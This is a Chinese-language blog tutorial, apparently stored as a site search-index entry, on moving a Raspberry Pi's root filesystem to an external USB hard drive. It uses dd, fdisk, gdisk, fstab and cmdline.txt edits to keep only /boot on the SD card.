\u9996\u5148\u786c\u4ef6\u914d\u7f6e\u662f\u8fd9\u6837\u7684\uff1a\u6211\u624b\u4e0a\u6709 8GB \u548c 16GB \u7684 C10 SD \u5361\u5404\u4e00\u5f20\uff0c500GB \u7684\u79fb\u52a8\u786c\u76d8\u4e00\u4e2a\uff08\u4e4b\u524d\u7b14\u8bb0\u672c\u7684\u673a\u68b0\u786c\u76d8\uff0c\u6362 SSD \u7684\u65f6\u5019\u62c6\u4e0b\u6765\u88c5\u5728\u79fb\u52a8\u786c\u76d8\u76d2\u91cc\uff09\uff0c\u6709\u6e90 USB Hub \u4e00\u4e2a\uff0c\u6811\u8393\u6d3e\u4e00\u4e2a\u3002\u5176\u4e2d\u79fb\u52a8\u786c\u76d8\u4e0a\u6709\u4e24\u4e2a NTFS \u5206\u533a\uff08Windows \u7684 C\u76d8\u548c D\u76d8\uff09\u548c\u4e00\u4e2a ext4 \u5206\u533a\uff08\u5f88\u4e45\u4ee5\u524d\u7684 Ubuntu \u7cfb\u7edf\uff0c\u6240\u6709\u6570\u636e\u90fd\u5728\u91cc\u9762\uff09\u3002 \u6211\u60f3\u5b9e\u73b0\u7684\u6548\u679c\u662f\u8fd9\u6837\u7684\uff1a\u6e05\u7a7a\u65e7\u7684 Windows C\u76d8\uff0890GB\uff09\uff0c\u5206\u51fa 30GB \u7ed9 Raspbian\uff0c\u7136\u540e\u6811\u8393\u6d3e\u8981\u4ece\u786c\u76d8\u542f\u52a8\u3002 \u7b80\u5355\u641c\u7d22\u4e86\u4e00\u4e0b\u53d1\u73b0\u76f4\u63a5\u4ece\u786c\u76d8\u542f\u52a8\u662f\u4e0d\u884c\u7684\uff0c\u56e0\u4e3a\u6811\u8393\u6d3e\u542f\u52a8\u7684\u65f6\u5019\u56fa\u5b9a\u662f\u4ece SD \u5361\u7684\u7b2c\u4e00\u4e2a\u5206\u533a\uff08/boot\uff09\u8bfb\u53d6 config.txt \u3001 cmdline.txt \u548c kernel.img \u8fd9\u4e09\u4e2a\u6587\u4ef6\u3002\u4f46\u662f\u9664\u6b64\u4e4b\u5916\uff0c\u5404\u4e2a\u5916\u63a5\u8bbe\u5907\u7684\u6302\u8f7d\u70b9\u5219\u662f\u6ca1\u6709\u9650\u5236\u7684\u3002\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u5c06 /boot \u5206\u533a\u653e\u5728 SD \u5361\u4e0a\uff0c\u5e76\u8bbe\u7f6e\u4e3a\u53ea\u8bfb\u7684\uff0c\u907f\u514d\u610f\u5916\u5173\u673a\u65f6\u635f\u574f\u4e0a\u9762\u7684\u6587\u4ef6\u7cfb\u7edf\uff1b\u540c\u65f6\u6211\u4eec\u628a\u7cfb\u7edf\u7684\u5176\u4ed6\u90e8\u5206\u90fd\u653e\u5728\u5916\u7f6e\u786c\u76d8\u4e0a\uff0c\u901a\u8fc7 USB \u8fde\u63a5\u5230\u6811\u8393\u6d3e\uff0c\u8fd9\u90e8\u5206\u662f\u53ef\u8bfb\u5199\u7684\u3002 \u6211\u4eec\u9996\u5148\u6309\u7167\u6b63\u5e38\u65b9\u5f0f\uff0c\u4ece\u6811\u8393\u6d3e\u7684\u7f51\u7ad9\u4e0a \u4e0b\u8f7d Raspbian \u955c\u50cf\uff0c\u6309\u7167 \u5b98\u65b9\u7684\u6307\u5bfc \uff0c\u5b89\u88c5\u5230 SD \u5361\u4e0a\u3002\u8fd9\u91cc\u7b80\u8981\u8bf4\u4e00\u4e0b\u5728 Mac OS X \u4e0a\u7684\u5b89\u88c5\u65b9\u5f0f\uff1a # \u9996\u5148\u5c06 SD \u5361\u63d2\u5165\u9002\u914d\u5668\uff0c\u8fde\u63a5\u5230 Mac # \u6253\u5f00\u7ec8\u7aef # \u5728\u5217\u51fa\u7684\u78c1\u76d8\u4e2d\u627e\u5230\u4f60\u7684 SD \u5361\u8bbe\u5907\uff0c\u4f8b\u5982 /dev/disk4 diskutil list # unmount diskutil unmountDisk /dev/disk4 # \u8fd9\u91cc\u66ff\u6362\u6210\u4f60\u7684 SD \u5361\u8bbe\u5907 # \u627e\u5230\u4f60\u4e0b\u8f7d\u7684\u955c\u50cf\uff08\u89e3\u538b\u7684 .img \u6587\u4ef6\uff09\uff0c\u5199\u5165\u5230\u4f60\u7684 SD \u5361\u8bbe\u5907 sudo dd bs=1m if=image.img of=/dev/rdisk4 # \u8fd9\u91cc\u6ce8\u610f\u662f rdisk # \u5199\u5165\u5b8c\u6210\u540e\u4ece Finder \u91cc\u5f39\u51fa SD \u5361\u5c31\u597d\u4e86 \u7136\u540e\u6309\u7167\u6b63\u5e38\u65b9\u5f0f\u8fdb\u884c\u7b2c\u4e00\u6b21\u542f\u52a8\uff0c\u4e5f\u53ef\u4ee5\u505a\u4e00\u4e9b\u7b80\u5355\u8bbe\u7f6e\u7684\u8c03\u6574\u3002\u6211\u662f\u63a5\u4e86\u952e\u76d8\u548c\u663e\u793a\u5668\u542f\u52a8\u7684\uff0c\u8fdb\u53bb\u540e\u9996\u5148\u6253\u5f00 raspi-config \u628a\u56fe\u5f62\u754c\u9762\u5173\u6389\u4e86\uff0c\u7136\u540e\u6253\u5f00\u4e86\u6444\u50cf\u5934\u3001I2C \u548c SPI \u8bbe\u5907\uff0c\u7136\u540e\u6211\u5c31\u91cd\u542f\u4e86\u3002\u63a5\u4e0b\u6765\u6211\u90fd\u662f\u901a\u8fc7 ssh \u8fdb\u884c\u7684\u64cd\u4f5c\u3002 \u901a\u8fc7 USB \u8fde\u63a5\u79fb\u52a8\u786c\u76d8\u3002 sudo fdisk -l \u770b\u4e00\u4e0b\u662f\u54ea\u4e2a\u8bbe\u5907\uff0c\u4e00\u822c\u90fd\u662f /dev/sda \u4e4b\u7c7b\u7684\u3002 \u5982\u679c\u6709\u4e0d\u60f3\u8981\u7684\u5206\u533a\u9700\u8981\u5220\u6389\u817e\u51fa\u7a7a\u95f4\u7684\u8bdd\uff0c sudo fdisk /dev/sda \u6253\u5f00 fdisk \u5de5\u5177\uff0c\u628a\u4e0d\u8981\u7684\u5206\u533a\u5220\u6389\uff0c\u65b0\u5efa\u4e00\u4e2a 30GB \u5206\u533a\u3002\u5177\u4f53\u600e\u4e48\u64cd\u4f5c\uff0c\u4ea4\u4e92\u6a21\u5f0f\u4e0b\u6709\u5e2e\u52a9\uff0c\u6ce8\u610f\u4e0d\u8981\u5220\u6389\u4e86\u60f3\u4fdd\u7559\u7684\u5206\u533a\u5373\u53ef\u3002\u5728\u4f60\u8f93\u5165 w \u547d\u4ee4\u6267\u884c\u5199\u5165\u4e4b\u524d\uff0c\u6240\u6709\u6539\u52a8\u90fd\u662f\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u4f60\u89c9\u5f97\u6709\u95ee\u9898\u7684\u8bdd\uff0c Ctrl-C \u9000\u51fa\u91cd\u6765\u5c31\u597d\u3002 \u521b\u5efa\u597d\u5206\u533a\u4e4b\u540e\u683c\u5f0f\u5316\u6210 ext4\uff1a sudo mkfs.ext4 /dev/sda1 \u3002 \u8fd0\u884c sudo gdisk /dev/sda \u8fdb\u5165 gdisk \u5de5\u5177\u7684\u4ea4\u4e92\u6a21\u5f0f\u3002\u5728\u8fd9\u91cc\u68c0\u89c6\u4e00\u4e0b\u4f60\u60f3\u7528\u4e8e Raspbian \u7684\u5206\u533a\uff0c\u83b7\u53d6\u5230 UUID\u3002\u4ee5\u4e0b\u4f8b\u5b50\u6765\u81ea Stefan\u2019s Blog root@raspberrypi:/home/pi# gdisk /dev/sda GPT fdisk (gdisk) version 0.8.5 Partition table scan: MBR: hybrid BSD: not present APM: not present GPT: present Found valid GPT with hybrid MBR; using GPT. Command (? for help): i Partition number (1-3): 2 Partition GUID code: 0FC63DAF-8483-4772-8E79-3D69D8477DE4 (Linux filesystem) Partition unique GUID: 176ADF0D-357D-4C4B-ADC0-371342F444AB First sector: 2099200 (at 1.0 GiB) Last sector: 23070719 (at 11.0 GiB) Partition size: 20971520 sectors (10.0 GiB) Attribute flags: 0000000000000000 Partition name: '' Command (? for help): q UUID \u662f\u8ddf\u5728 \u201cPartition unique GUID\u201d \u540e\u9762\u90a3\u4e32\u5b57\u6bcd\uff0c\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u4e5f\u5c31\u662f 176ADF0D-357D-4C4B-ADC0-371342F444AB \u3002 \u63a5\u4e0b\u6765\u7f16\u8f91 /boot/cmdline.txt \uff0c\u5c06\u5176\u4e2d root=/dev/mmcblk0p2 \u6539\u4e3a root=PARTUUID=\u5206\u533a\u7684UUID \u7136\u540e\u4fdd\u5b58\u3002 \u968f\u540e\uff0c\u7f16\u8f91 /etc/fstab \u5c06 /boot \u6302\u8f7d\u4e3a\u53ea\u8bfb\u6a21\u5f0f\uff0c\u5c06\u79fb\u52a8\u786c\u76d8\u4e5f\u6dfb\u52a0\u8fdb\u53bb\uff0c\u6302\u8f7d\u4e3a\u53ef\u8bfb\u5199\u3002\u9ed8\u8ba4\u7684\u5185\u5bb9\u662f\u8fd9\u6837\u7684\uff1a proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat defaults 0 2 /dev/mmcblk0p2 / ext4 defaults,noatime 0 1 # a swapfile is not a swap partition, no line here # use dphys-swapfile swap[on|off] for that \u66f4\u6539\u4e4b\u540e\u5185\u5bb9\u5927\u6982\u50cf\u8fd9\u6837\uff1a proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat ro 0 2 /dev/sda1 / ext4 defaults,errors=remount-ro 0 1 #/dev/mmcblk0p2 / ext4 defaults,noatime 0 1 # a swapfile is not a swap partition, no line here # use dphys-swapfile swap[on|off] for that \u6700\u540e\uff0c\u5c06 / \u4e0b\u7684\u5185\u5bb9\u5168\u90e8\u5199\u5165\u5230\u79fb\u52a8\u786c\u76d8\u4e2d\u3002\u4ee5\u6211\u81ea\u5df1\u7684\u914d\u7f6e\u4e3a\u4f8b\uff0c\u4f7f\u7528 /dev/sda1 \u5206\u533a\uff1a dd if=/dev/mmcblk0p2 of=/dev/sda1 \u56e0\u4e3a Raspbian \u9ed8\u8ba4\u662f\u5c06 SD \u5361\u7684\u7b2c\u4e8c\u4e2a\u5206\u533a\uff08\u4e5f\u5c31\u662f /dev/mmcblk0p2 \uff09\u6302\u8f7d\u5230 / \u7684\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u4ece\u8fd9\u4e2a\u5206\u533a\u8bfb\u53d6\uff0c\u5199\u5165\u5230\u76ee\u6807\u5206\u533a\u5c31\u53ef\u4ee5\u3002 \u5199\u5165\u5b8c\u6210\u4e4b\u540e\uff0c /dev/sda1 \u7684\u5927\u5c0f\u4e0e /dev/mmcblk0p2 \u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u4f1a\u8fdc\u8fdc\u5c0f\u4e8e\u4f60\u521b\u5efa\u8fd9\u4e2a\u5206\u533a\u65f6\u6307\u5b9a\u7684\u5927\u5c0f\u3002\u53ef\u4ee5\u4f7f\u7528 sudo resize2fs /dev/sda1 \u6765\u5c55\u5f00\u5230\u5b8c\u6574\u7684\u5927\u5c0f\u3002 \u63a5\u4e0b\u6765\u91cd\u542f\u5c31\u597d\u4e86\u3002 \u5728\u8fc7\u7a0b\u4e2d\u5982\u679c\u4e0d\u614e\u4fee\u6539\u9519\u4e86\u53c2\u6570\uff0c\u6216\u8005\u5c06\u4e0d\u6b63\u786e\u7684\u5206\u533a\u6302\u8f7d\u4e3a\u53ea\u8bfb\u4e86\uff0c\u4e0d\u5fc5\u60ca\u614c\uff0c\u4e5f\u4e0d\u9700\u8981\u9a6c\u4e0a\u91cd\u88c5\u7cfb\u7edf\u3002\u53ea\u8981\u5c06\u6811\u8393\u6d3e\u65ad\u7535\uff0cSD \u5361\u62d4\u51fa\u6765\u8fde\u63a5\u5230\u522b\u7684\u7535\u8111\u4e0a\uff0c\u4fee\u6539 /boot/cmdline.txt \u91cc\u7684\u53c2\u6570\uff0c\u6539\u4e3a\u9ed8\u8ba4\u7684\u6302\u8f7d SD \u5361\u7b2c\u4e8c\u5206\u533a\u5373\u53ef\u3002\u91cd\u542f\u540e\u53ef\u4ee5\u901a\u8fc7 sudo mount -o remount,rw /dev/sda1 \u5c06 /etc/fstab \u4e2d\u6307\u5b9a\u7684\u5206\u533a\u91cd\u65b0\u6302\u8f7d\u4e3a\u53ef\u8bfb\u5199\u6a21\u5f0f\u6765\u8fdb\u884c\u4fee\u6539\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.mynook.info/post/boot-raspberrypi-from-external-hdd/","title":"\u8bbe\u7f6e\u6811\u8393\u6d3e\u4f7f\u7528\u5916\u7f6e\u786c\u76d8\u542f\u52a8"},{"location":"%E7%AE%97%E6%B3%95/","text":"","title":"\u7b97\u6cd5"}]}